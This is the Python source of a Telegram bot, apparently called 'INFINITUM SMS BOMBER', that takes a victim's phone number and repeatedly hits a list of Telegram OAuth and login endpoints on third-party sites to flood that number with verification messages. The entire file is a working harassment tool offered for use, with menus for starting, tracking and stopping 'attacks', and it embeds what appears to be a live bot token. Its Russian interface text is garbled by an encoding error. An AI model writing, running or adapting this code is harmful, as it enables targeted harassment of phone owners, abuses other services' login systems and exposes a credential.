import asyncio
import re
import aiohttp
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from fake_useragent import UserAgent
import logging
from datetime import datetime

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8405247051:AAGy5KEes_ngcTTsBohoiWydavx3uKgOjK0"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

active_attacks = {}
user_messages = {}

class AttackState(StatesGroup):
    awaiting_phone = State()
    awaiting_attempts = State()

ATTACK_URLS = [
    'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
    'https://translations.telegram.org/auth/request',
    'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
    'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
    'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
    'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
    'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
    'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%%2Fbot-t.com%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
    'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
    'https://my.telegram.org/auth/send_password'
]

def is_valid_phone(phone):
    pattern = r'^\+?[0-9]{10,15}$'
    return bool(re.match(pattern, str(phone)))

async def send_request(session, url, phone, user_agent):
    try:
        async with session.post(url, headers={'user-agent': user_agent}, data={'phone': phone}, timeout=10) as response:
            return response.status == 200
    except:
        return False

async def cleanup_user_messages(user_id):
    if user_id in user_messages:
        for msg_id in user_messages[user_id]:
            try:
                await bot.delete_message(user_id, msg_id)
            except:
                pass
        user_messages[user_id] = []

async def save_message_id(user_id, message_id):
    if user_id not in user_messages:
        user_messages[user_id] = []
    user_messages[user_id].append(message_id)

async def run_attack(phone, attempts, user_id, message_id):
    total_success = 0
    user_agent = UserAgent().random
    
    async with aiohttp.ClientSession() as session:
        for attempt in range(1, attempts + 1):
            if user_id not in active_attacks:
                break
                
            success_count = 0
            tasks = []
            
            for url in ATTACK_URLS:
                tasks.append(send_request(session, url, phone, user_agent))
            
            results = await asyncio.gather(*tasks)
            success_count = sum(results)
            total_success += success_count
            
            progress_percent = int((success_count / len(ATTACK_URLS)) * 100)
            progress_bar = "üü¢" * int(progress_percent / 10) + "‚ö™" * (10 - int(progress_percent / 10))
            
            stats_text = f"""
‚ö°Ô∏è <b>INFINITUM ATTACK PROGRESS</b> ‚ö°Ô∏è

‚îè‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
‚îÉ üìû <b>–¶–µ–ª—å:</b> <code>{phone}</code>
‚îÉ üìä <b>–ü–æ–ø—ã—Ç–∫–∞:</b> {attempt}/{attempts}
‚îÉ ‚úÖ <b>–£—Å–ø–µ—à–Ω–æ:</b> {success_count}/{len(ATTACK_URLS)}
‚îÉ üî• <b>–í—Å–µ–≥–æ:</b> {total_success}
‚îó‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ

{progress_bar} {progress_percent}%

‚è∞ <b>–ù–∞—á–∞—Ç–æ:</b> {datetime.now().strftime('%H:%M:%S')}
            """
            
            try:
                await bot.edit_message_text(
                    chat_id=user_id,
                    message_id=message_id,
                    text=stats_text,
                    parse_mode='HTML'
                )
            except Exception as e:
                logger.error(f"Error editing message: {e}")
            
            if attempt < attempts:
                await asyncio.sleep(5)
    
    return total_success

def main_keyboard():
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="üéØ –ù–∞—á–∞—Ç—å –∞—Ç–∞–∫—É"), KeyboardButton(text="üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞")],
            [KeyboardButton(text="‚ùì –ü–æ–º–æ—â—å"), KeyboardButton(text="üõë –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –∞—Ç–∞–∫—É")]
        ],
        resize_keyboard=True,
        input_field_placeholder="–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ..."
    )
    return keyboard

def cancel_keyboard():
    keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="‚ùå –û—Ç–º–µ–Ω–∞")]],
        resize_keyboard=True
    )
    return keyboard

def back_keyboard():
    keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="üîô –í–µ—Ä–Ω—É—Ç—å—Å—è –≤ –º–µ–Ω—é")]],
        resize_keyboard=True
    )
    return keyboard

@dp.message(Command("start"))
async def cmd_start(message: Message):
    await cleanup_user_messages(message.from_user.id)
    
    welcome_text = """
 <b>INFINITUM SMS BOMBER</b> 
<i>by @jadddxxx</i>

 <b>–ú–æ—â–Ω—ã–π SMS —Å–ø–∞–º–º–µ—Ä –¥–ª—è Telegram</b>

<b>–í–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏:</b>
‚Ä¢ –£–ª—å—Ç—Ä–∞-–±—ã—Å—Ç—Ä—ã–µ –∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω—ã–µ –∞—Ç–∞–∫–∏
‚Ä¢ –ü–æ–¥–¥–µ—Ä–∂–∫–∞ –º–Ω–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω—ã—Ö —Ü–µ–ª–µ–π
‚Ä¢ –ö—Ä–∞—Å–∏–≤—ã–π –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å

üëâ <b>–ù–∞–∂–º–∏—Ç–µ '–ù–∞—á–∞—Ç—å –∞—Ç–∞–∫—É' —á—Ç–æ–±—ã –Ω–∞—á–∞—Ç—å</b>
    """
    
    msg = await message.answer_animation(
        animation="https://i.imgur.com/95JCSDE.gif",
        caption=welcome_text,
        parse_mode='HTML',
        reply_markup=main_keyboard()
    )
    await save_message_id(message.from_user.id, msg.message_id)

@dp.message(F.text == "üîô –í–µ—Ä–Ω—É—Ç—å—Å—è –≤ –º–µ–Ω—é")
async def back_to_menu(message: Message):
    await cleanup_user_messages(message.from_user.id)
    await cmd_start(message)

@dp.message(F.text == "‚ùì –ü–æ–º–æ—â—å")
@dp.message(Command("help"))
async def cmd_help(message: Message):
    await cleanup_user_messages(message.from_user.id)
    
    help_text = """
üìñ <b>–ü–æ–º–æ—â—å INFINITUM | Spam</b>

<b>–ö–∞–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:</b>
1. –ù–∞–∂–º–∏—Ç–µ '–ù–∞—á–∞—Ç—å –∞—Ç–∞–∫—É'
2. –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ —Ü–µ–ª–∏
3. –£–∫–∞–∂–∏—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–ø—ã—Ç–æ–∫ (1-20)
4. –î–æ–∂–¥–∏—Ç–µ—Å—å –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –∞—Ç–∞–∫–∏

üîß <b>–ü–æ–¥–¥–µ—Ä–∂–∫–∞:</b>
@jadddxxx
    """
    
    msg = await message.answer_animation(
        animation="https://i.imgur.com/95JCSDE.gif",
        caption=help_text,
        parse_mode='HTML',
        reply_markup=back_keyboard()
    )
    await save_message_id(message.from_user.id, msg.message_id)

@dp.message(F.text == "üéØ –ù–∞—á–∞—Ç—å –∞—Ç–∞–∫—É")
@dp.message(Command("attack"))
async def cmd_attack(message: Message, state: FSMContext):
    await cleanup_user_messages(message.from_user.id)
    
    user_id = message.from_user.id
    
    if user_id in active_attacks:
        msg = await message.answer("‚ö†Ô∏è –£ –≤–∞—Å —É–∂–µ –µ—Å—Ç—å –∞–∫—Ç–∏–≤–Ω–∞—è –∞—Ç–∞–∫–∞. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /stop —á—Ç–æ–±—ã –æ—Ç–º–µ–Ω–∏—Ç—å –µ—ë.")
        await save_message_id(user_id, msg.message_id)
        return
    
    attack_text = """
üîª <b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –∂–µ—Ä—Ç–≤—ã</b> üîª

üìû <b>–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ —Ü–µ–ª–∏:</b>

üåç <b>–§–æ—Ä–º–∞—Ç:</b> <code>+79123456789</code> –∏–ª–∏ <code>79123456789</code>
    """
    
    msg = await message.answer(attack_text, parse_mode='HTML', reply_markup=cancel_keyboard())
    await save_message_id(user_id, msg.message_id)
    await state.set_state(AttackState.awaiting_phone)

@dp.message(AttackState.awaiting_phone)
async def process_phone(message: Message, state: FSMContext):
    if message.text == "‚ùå –û—Ç–º–µ–Ω–∞":
        await state.clear()
        await cleanup_user_messages(message.from_user.id)
        await cmd_start(message)
        return
        
    phone = message.text.strip()
    
    if not is_valid_phone(phone):
        msg = await message.answer("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –Ω–æ–º–µ—Ä–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –Ω–æ–º–µ—Ä:")
        await save_message_id(message.from_user.id, msg.message_id)
        return
    
    await state.update_data(phone=phone)
    
    attempts_text = """
üìä <b>–°–∫–æ–ª—å–∫–æ –±—É–¥–µ–º –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å ?</b>

‚ö°Ô∏è <b>–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–ø—ã—Ç–æ–∫ (1-20):</b>

üí° <b>–†–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è:</b> 5-10 –ø–æ–ø—ã—Ç–æ–∫
    """
    
    msg = await message.answer(attempts_text, parse_mode='HTML', reply_markup=cancel_keyboard())
    await save_message_id(message.from_user.id, msg.message_id)
    await state.set_state(AttackState.awaiting_attempts)

@dp.message(AttackState.awaiting_attempts)
async def process_attempts(message: Message, state: FSMContext):
    if message.text == "‚ùå –û—Ç–º–µ–Ω–∞":
        await state.clear()
        await cleanup_user_messages(message.from_user.id)
        await cmd_start(message)
        return
        
    user_id = message.from_user.id
    
    try:
        attempts = int(message.text.strip())
        if attempts < 1 or attempts > 20:
            msg = await message.answer("‚ùå –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ –æ—Ç 1 –¥–æ 20:")
            await save_message_id(user_id, msg.message_id)
            return
    except ValueError:
        msg = await message.answer("‚ùå –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ —á–∏—Å–ª–æ:")
        await save_message_id(user_id, msg.message_id)
        return
    
    data = await state.get_data()
    phone = data.get('phone')
    
    if not phone:
        msg = await message.answer("‚ùå –û—à–∏–±–∫–∞: –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω. –ù–∞—á–Ω–∏—Ç–µ –∑–∞–Ω–æ–≤–æ —Å /attack")
        await save_message_id(user_id, msg.message_id)
        await state.clear()
        return
    
    stats_message = await message.answer("""
‚ö°Ô∏è <b>INFINITUM ATTACK STARTING</b> ‚ö°Ô∏è

‚îè‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
‚îÉ üìû <b>–¶–µ–ª—å:</b> <code>–ó–∞–≥—Ä—É–∑–∫–∞...</code>
‚îÉ üìä <b>–ü–æ–ø—ã—Ç–∫–∞:</b> 0/0
‚îÉ ‚úÖ <b>–£—Å–ø–µ—à–Ω–æ:</b> 0/0
‚îÉ üî• <b>–í—Å–µ–≥–æ:</b> 0
‚îó‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ

‚ö™‚ö™‚ö™‚ö™‚ö™‚ö™‚ö™‚ö™‚ö™‚ö™ 0%

‚è∞ <b>–ù–∞—á–∞—Ç–æ:</b> –ó–∞–≥—Ä—É–∑–∫–∞...
    """, parse_mode='HTML')
    await save_message_id(user_id, stats_message.message_id)
    
    active_attacks[user_id] = True
    await state.clear()
    
    total_success = await run_attack(phone, attempts, user_id, stats_message.message_id)
    
    if user_id in active_attacks:
        del active_attacks[user_id]
    
    total_requests = attempts * len(ATTACK_URLS)
    success_rate = (total_success / total_requests * 100) if total_requests > 0 else 0
    
    finish_text = f"""
 <b>–°–ø–∞–º —É—Å–ø–µ—à–Ω–æ —Å—Ä–æ–±–æ—Ç–∞–ª. </b> 

‚îè‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
‚îÉ üìû <b>–¶–µ–ª—å:</b> <code>{phone}</code>
‚îÉ üî• <b>–í—Å–µ–≥–æ —É—Å–ø–µ—à–Ω–æ:</b> {total_success}
‚îÉ ‚úÖ <b>–ü—Ä–æ—Ü–µ–Ω—Ç —É—Å–ø–µ—Ö–∞:</b> {success_rate:.1f}%
‚îÉ ‚è∞ <b>–ó–∞–≤–µ—Ä—à–µ–Ω–æ:</b> {datetime.now().strftime('%H:%M:%S')}
‚îó‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ

üí• <b>–ê—Ç–∞–∫–∞ —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!</b>

–ù–∞–∂–º–∏—Ç–µ 'üéØ –ù–∞—á–∞—Ç—å –∞—Ç–∞–∫—É' –¥–ª—è –Ω–æ–≤–æ–π –∞—Ç–∞–∫–∏
    """
    
    try:
        await bot.edit_message_text(
            chat_id=user_id,
            message_id=stats_message.message_id,
            text=finish_text,
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"Error editing message: {e}")
        msg = await message.answer(finish_text, parse_mode='HTML')
        await save_message_id(user_id, msg.message_id)
    
    await cleanup_user_messages(user_id)
    await message.answer("‚úÖ –ê—Ç–∞–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!", reply_markup=main_keyboard())

@dp.message(F.text == "üõë –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –∞—Ç–∞–∫—É")
@dp.message(Command("stop"))
async def cmd_stop(message: Message):
    user_id = message.from_user.id
    
    if user_id in active_attacks:
        del active_attacks[user_id]
        await message.answer("üõë –ê—Ç–∞–∫–∞ —É—Å–ø–µ—à–Ω–æ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞.", reply_markup=main_keyboard())
    else:
        await message.answer("‚ùå –ê–∫—Ç–∏–≤–Ω—ã—Ö –∞—Ç–∞–∫ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.", reply_markup=main_keyboard())

@dp.message(F.text == "üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞")
@dp.message(Command("stats"))
async def cmd_stats(message: Message):
    await cleanup_user_messages(message.from_user.id)
    
    stats_text = f"""
üìä <b>–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –ë–æ—Ç–∞.</b>
‚îè‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
‚îÉ üë• <b>–ê–∫—Ç–∏–≤–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏:</b> {len(active_attacks)}
‚îÉ üéØ <b>–ê–∫—Ç–∏–≤–Ω—ã–µ –∞—Ç–∞–∫–∏:</b> {len(active_attacks)}
‚îÉ üåê <b>–¶–µ–ª–µ–≤—ã–µ URL:</b> {len(ATTACK_URLS)}
‚îÉ ‚è∞ <b>–í—Ä–µ–º—è —Å–µ—Ä–≤–µ—Ä–∞:</b> {datetime.now().strftime('%H:%M:%S')}
‚îó‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
    """
    
    msg = await message.answer_animation(
        animation="https://i.imgur.com/95JCSDE.gif",
        caption=stats_text,
        parse_mode='HTML',
        reply_markup=back_keyboard()
    )
    await save_message_id(message.from_user.id, msg.message_id)

@dp.message()
async def handle_other_messages(message: Message, state: FSMContext):
    current_state = await state.get_state()
    
    if current_state is None:
        msg = await message.answer("üí° –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–Ω–æ–ø–∫–∏ –Ω–∏–∂–µ –¥–ª—è –Ω–∞–≤–∏–≥–∞—Ü–∏–∏ –∏–ª–∏ /help –¥–ª—è –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–π", reply_markup=main_keyboard())
        await save_message_id(message.from_user.id, msg.message_id)
    else:
        msg = await message.answer("‚ùå –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –∑–∞–≤–µ—Ä—à–∏—Ç–µ —Ç–µ–∫—É—â—É—é –æ–ø–µ—Ä–∞—Ü–∏—é –∏–ª–∏ –Ω–∞–∂–º–∏—Ç–µ '‚ùå –û—Ç–º–µ–Ω–∞'")
        await save_message_id(message.from_user.id, msg.message_id)

@dp.errors()
async def errors_handler(update, error):
    logger.error(f"Update {update} caused error {error}")
    return True

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())